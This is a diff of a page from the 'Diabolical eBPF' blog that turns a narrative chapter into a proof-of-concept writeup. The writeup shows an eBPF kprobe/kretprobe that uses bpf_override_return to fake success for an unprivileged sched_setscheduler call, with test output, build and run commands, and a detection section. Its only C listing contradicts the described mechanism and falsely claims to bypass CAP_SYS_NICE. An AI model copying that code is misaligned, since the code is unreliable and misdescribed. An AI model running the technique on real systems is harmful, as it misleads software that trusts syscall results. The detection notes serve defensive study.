@@ -163,6 +163,9 @@
                     
                     
                 
+                    
+                    
+                
             </div>
         </nav>
 
@@ -179,31 +182,111 @@
                     </header>
 
                     <div class="post-content">
-                        <p>Act III: Total Control</p>
+                        <p><strong>Chapter 14: Forging the Return Value of <code class="language-plaintext highlighter-rouge">sched_setscheduler</code></strong></p>
 
-<p><strong>Chapter 14: Becoming the System’s Top Priority</strong></p>
+<p>This is a userspace-illusion bypass. Same shape as the token forgery in chapter 18: the kernel’s internal state is unchanged, but the syscall return value is rewritten before it reaches libc. Anything that trusts the return value acts as if the call succeeded; anything that goes back and asks the kernel directly sees the truth.</p>
 
-<p>I used to envy the kernel’s real-time tasks: they ran on demand, slicing through the queue like a hot knife through butter. Meanwhile, my processes scooped up CPU slots at best-effort speed.</p>
+<p>The target is <code class="language-plaintext highlighter-rouge">__arm64_sys_sched_setscheduler</code>. I checked <code class="language-plaintext highlighter-rouge">/sys/kernel/debug/error_injection/list</code> on the linuxkit 6.12 aarch64 kernel I was testing against and it was there, which is the only reason this works — <code class="language-plaintext highlighter-rouge">bpf_override_return</code> silently no-ops against functions not on that list. Most syscall entrypoints are on the list; most internal kernel functions are not.</p>
 
-<p>One night, with the system logs humming and the midnight coffee brewing, I turned my sights on the scheduler itself. I whispered into the <code class="language-plaintext highlighter-rouge">sched_setscheduler()</code> bouncer, making it believe I held <code class="language-plaintext highlighter-rouge">CAP_SYS_NICE</code> privileges.</p>
+<p>The mechanism is a kprobe/kretprobe pair. The kprobe records the caller’s tgid and the requested policy into an inflight hash map. The kretprobe looks up the tgid, decides whether to flip, and calls <code class="language-plaintext highlighter-rouge">bpf_override_return(ctx, 0)</code>. I emit a ringbuf event on every call with <code class="language-plaintext highlighter-rouge">orig_ret</code> and a <code class="language-plaintext highlighter-rouge">flipped</code> flag so the loader can log both paths.</p>
 
-<p>The scheduler didn’t even blink. My process strutted past the capability check into the SCHED_FIFO VIP section, hogging CPU time while mortal processes waited in polite silence.</p>
+<p>Baseline: an unprivileged shell calling <code class="language-plaintext highlighter-rouge">chrt -f 50 $$</code> fails with <code class="language-plaintext highlighter-rouge">EPERM</code> because it has no <code class="language-plaintext highlighter-rouge">CAP_SYS_NICE</code>. With the probe loaded in wildcard mode:</p>
 
-<p>To the monitoring tools, it looked like benign real-time tuning. In reality, I had hijacked the system’s temporal control: no throttling, no preemption, pure unadulterated cycles.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>=== baseline: t14 runs chrt -f 50 $$ (no BPF) ===
+chrt: failed to set pid 0's policy: Operation not permitted
+baseline_ret=1
 
-<p>With time on my side, I orchestrated chaos: starved critical daemons, modulated CPU bursts as a covert channel, all under the guise of legitimate scheduling tweaks.</p>
+=== with BPF: same chrt call ===
+override_ret=0
 
-<p>It was beautiful: at the front of every line, above every queue, unstoppable.</p>
+[sched] pid=18843 tgid=18843 comm=chrt orig_ret=-1 flipped=1
+</pre></td></tr></tbody></table></code></pre></div></div>
 
-<p>```c
-SEC(“kprobe/sched_setscheduler”)
-int impersonate_realtime(struct pt_regs *ctx) {
-    pid_t pid = PT_REGS_PARM1(ctx);
-    struct sched_param *param = (struct sched_param *)PT_REGS_PARM3(ctx);
-    param-&gt;sched_priority = MAX_RT_PRIO - 1; // highest priority
-    return 0; // bypass CAP_SYS_NICE
-}
-char LICENSE[] SEC(“license”) = “GPL”;</p>
+<p><code class="language-plaintext highlighter-rouge">orig_ret=-1 flipped=1</code> is the smoking gun. The kernel returned <code class="language-plaintext highlighter-rouge">-EPERM</code>, the kretprobe rewrote the return value to <code class="language-plaintext highlighter-rouge">0</code>, and <code class="language-plaintext highlighter-rouge">chrt</code> — which gates its exit status on the syscall return — reported success.</p>
+
+<p>Here is what I want to be explicit about, because this is the honest scope of the bypass: <code class="language-plaintext highlighter-rouge">task_struct-&gt;policy</code> is not modified. The scheduler’s runqueue placement is not modified. The task is still on whatever policy it was on before the call. If something in userspace calls <code class="language-plaintext highlighter-rouge">sched_getscheduler()</code> or reads <code class="language-plaintext highlighter-rouge">/proc/[pid]/sched</code> or <code class="language-plaintext highlighter-rouge">/proc/[pid]/stat</code> field 41, it will see the real, unchanged policy. The illusion is exactly one syscall wide.</p>
+
+<p>That narrow scope is the whole point. <code class="language-plaintext highlighter-rouge">chrt</code>, <code class="language-plaintext highlighter-rouge">systemd</code>, and the many libraries that gate behaviour on “did setscheduler return 0” will proceed as though the task is now SCHED_FIFO. They won’t re-verify. That’s the class of target this primitive is aimed at.</p>
+
+<h2 id="hook-points">Hook points</h2>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">kprobe/__arm64_sys_sched_setscheduler</code> — record caller into inflight map.</li>
+  <li><code class="language-plaintext highlighter-rouge">kretprobe/__arm64_sys_sched_setscheduler</code> — <code class="language-plaintext highlighter-rouge">bpf_override_return(ctx, 0)</code>
+when target matches; always emits a ringbuf event recording the
+original return and whether it was flipped.</li>
+</ul>
+
+<p>The loader greps <code class="language-plaintext highlighter-rouge">/proc/kallsyms</code> at startup and refuses to run if the
+target symbol is missing (wrong arch / non-kprobe-eligible kernel).</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/sched_setscheduler"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">impersonate_realtime</span><span class="p">(</span><span class="k">struct</span> <span class="n">pt_regs</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">pid_t</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">PT_REGS_PARM1</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
+    <span class="k">struct</span> <span class="n">sched_param</span> <span class="o">*</span><span class="n">param</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sched_param</span> <span class="o">*</span><span class="p">)</span><span class="n">PT_REGS_PARM3</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
+    <span class="n">param</span><span class="o">-&gt;</span><span class="n">sched_priority</span> <span class="o">=</span> <span class="n">MAX_RT_PRIO</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// highest priority</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// bypass CAP_SYS_NICE</span>
+<span class="p">}</span>
+<span class="kt">char</span> <span class="n">LICENSE</span><span class="p">[]</span> <span class="n">SEC</span><span class="p">(</span><span class="s">"license"</span><span class="p">)</span> <span class="o">=</span> <span class="s">"GPL"</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="build">Build</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>cd /Users/mbhatt/spaceclaw/evilBPF/dBPF-pocs
+docker run --rm -v "$PWD":/work -w /work dbpf-base \
+  bash -c 'cd pocs/ch14-sched-fifo &amp;&amp; make'
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="run">Run</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>./build/ch14-sched-fifo --help
+./build/ch14-sched-fifo --all              # wildcard: flip every caller
+./build/ch14-sched-fifo --tgid 1234        # specific tgid only
+./build/ch14-sched-fifo 1234 5678          # back-compat positional tgids
+./build/ch14-sched-fifo --all &gt; events.jsonl 2&gt; status.log
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="detection">Detection</h2>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">bpftool prog show type kprobe</code> lists <code class="language-plaintext highlighter-rouge">kp_sched</code> / <code class="language-plaintext highlighter-rouge">kr_sched</code> attached to <code class="language-plaintext highlighter-rouge">__arm64_sys_sched_setscheduler</code>. Neither tracing tools nor observability agents normally hook that symbol; a probe on it from a non-security process is anomalous.</li>
+  <li><code class="language-plaintext highlighter-rouge">/sys/kernel/tracing/kprobe_events</code> shows the dynamic entry.</li>
+  <li>Hosts with <code class="language-plaintext highlighter-rouge">kernel.unprivileged_bpf_disabled=1</code> plus a strict LSM/lockdown profile cannot load <code class="language-plaintext highlighter-rouge">bpf_override_return</code>-using programs at all (requires <code class="language-plaintext highlighter-rouge">CAP_SYS_ADMIN</code> + <code class="language-plaintext highlighter-rouge">CONFIG_BPF_KPROBE_OVERRIDE</code>).</li>
+  <li>A detector that cross-checks the reported policy against <code class="language-plaintext highlighter-rouge">task_struct-&gt;policy</code> via <code class="language-plaintext highlighter-rouge">/proc/[pid]/sched</code> would catch the divergence immediately. I did not see anything in the wild doing this.</li>
+</ul>
+
+<h2 id="limitations--arch-notes">Limitations / arch notes</h2>
+
+<ul>
+  <li>The kprobe target is arch-specific — <code class="language-plaintext highlighter-rouge">__arm64_sys_*</code> on aarch64, <code class="language-plaintext highlighter-rouge">__x64_sys_*</code> on x86_64. The BPF object as shipped is aarch64 only.</li>
+  <li><code class="language-plaintext highlighter-rouge">bpf_override_return</code> requires <code class="language-plaintext highlighter-rouge">CONFIG_BPF_KPROBE_OVERRIDE=y</code> AND the target syscall to be in <code class="language-plaintext highlighter-rouge">/sys/kernel/debug/error_injection/list</code>. Most internal kernel functions are not on the list, which is why we hook the syscall entrypoint rather than the deeper <code class="language-plaintext highlighter-rouge">__sched_setscheduler</code> core.</li>
+  <li>The override does not change actual scheduler state — only what userspace observes. A subsequent <code class="language-plaintext highlighter-rouge">sched_getscheduler()</code> returns the real, unchanged policy.</li>
+  <li>On stock cloud kernels with hardened lockdown or SELinux, <code class="language-plaintext highlighter-rouge">bpf_override_return</code> may be denied even with <code class="language-plaintext highlighter-rouge">CAP_SYS_ADMIN</code>.</li>
+</ul>
 
                     </div>
                 </article>
@@ -213,7 +296,7 @@ char LICENSE[] SEC(“license”) = “GPL”;</p>
 
             <footer class="site-footer">
                 <div class="footer-content">
-                    <p>&copy; 2025 Diabolical eBPF. All rights reserved.</p>
+                    <p>&copy; 2026 Diabolical eBPF. All rights reserved.</p>
                 </div>
             </footer>
         </div>
